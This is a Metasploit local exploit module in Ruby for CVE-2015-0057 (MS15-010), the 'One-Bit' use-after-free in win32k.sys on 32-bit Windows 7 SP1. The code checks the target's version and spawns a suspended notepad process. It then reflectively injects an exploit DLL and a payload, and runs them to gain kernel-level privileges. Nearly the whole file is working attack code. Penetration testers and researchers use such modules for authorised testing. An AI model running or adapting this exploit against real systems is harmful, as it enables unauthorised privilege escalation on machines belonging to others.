##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'            => 'Windows win32k!tagSBINFO Use After Free',
      'Description'     => %q{
        This module exploits a use after free vulnerability in win32k.sys. Under
        specific conditions win32k!xxxEnableWndSBArrows makes a usermode
        callback which can free a windows SBInfo structure. By replacing the
        freed structure with a win32k!tagPROPLIST structure an attacker can
        overwrite adjacent memory. The technique employed by this module
        corrupts an adjacent window structure to set the bServerSideWindowProc
        flag to gain code execution in the context of the kernel. This
        exposure is known as the "One-Bit" vulnerability.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Udi Yavo', # vulnerability discovery
          'Spencer McIntyre' # msf module
        ],
      'Arch'            => [ ARCH_X86 ],
      'Platform'        => 'win',
      'SessionTypes'    => [ 'meterpreter' ],
      'DefaultOptions'  =>
        {
          'EXITFUNC'    => 'thread',
        },
      'Targets'         =>
        [
          # Tested on (32 bits):
          # * Windows 7 SP1
          [ 'Windows 7 SP1 x86', { 'Arch' => ARCH_X86 } ],
        ],
      'Payload'         =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'DefaultOptions'  =>
        {
          'WfsDelay'    => 20
        },
      'References'      =>
        [
          ['CVE', '2015-0057'],
          ['BID', '72466'],
          ['MSB', 'MS15-010'],
          ['URL', 'http://breakingmalware.com/vulnerabilities/one-bit-rule-bypassing-windows-10-protections-using-single-bit/']
        ],
      'DisclosureDate'  => 'Feb 10 2015',
      'DefaultTarget'   => 0
    }))
  end

  def check
    os = sysinfo["OS"]
    if os !~ /windows/i
      return Exploit::CheckCode::Unknown
    end

    if sysinfo["Architecture"] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo["Architecture"] =~ /x86/i
      arch = ARCH_X86
    end

    return Exploit::CheckCode::Safe unless arch == ARCH_X86

    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")
    return Exploit::CheckCode::Safe unless build == 7601
  end

  def uxtheme_is_loaded?
    result = client.railgun.kernel32.GetModuleHandleA('uxtheme.dll')
    return result['return'] != 0
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "Exploit not available on this system.")
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo["Architecture"] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo["Architecture"] =~ /x86/ && target.arch.first == ARCH_X86_64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Launching suspended notepad to host the exploit...')
    # the process needs to be suspended so uxtheme will not have been loaded
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Suspended' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      if uxtheme_is_loaded?
        print_error('The current process already has the uxtheme.dll loaded, the exploit will not work')
        return
      end
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0057', 'cve-2015-0057.x86.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

end
